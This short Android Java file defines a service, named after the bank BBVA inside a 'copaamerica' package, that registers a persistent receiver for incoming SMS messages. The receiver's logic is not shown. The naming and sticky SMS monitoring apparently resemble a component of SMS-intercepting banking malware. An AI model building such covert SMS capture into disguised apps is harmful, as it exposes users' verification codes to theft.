package com.example.copaamerica;

import android.app.IntentService;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.MediaPlayer;
import android.os.IBinder;
import android.widget.Toast;

public class BBVAServActivity extends Service{
	
    public void onCreate() {
  }


  @Override
  public int onStartCommand(Intent intenc, int flags, int idArranque) {
	  final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	  IntentFilter filter = new IntentFilter(SMS_RECEIVED);
	  BroadcastReceiver receiver = new MySMSMonitor();
	  registerReceiver(receiver, filter);
      return START_STICKY;
  }

  @Override
  public void onDestroy() {
  }

	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
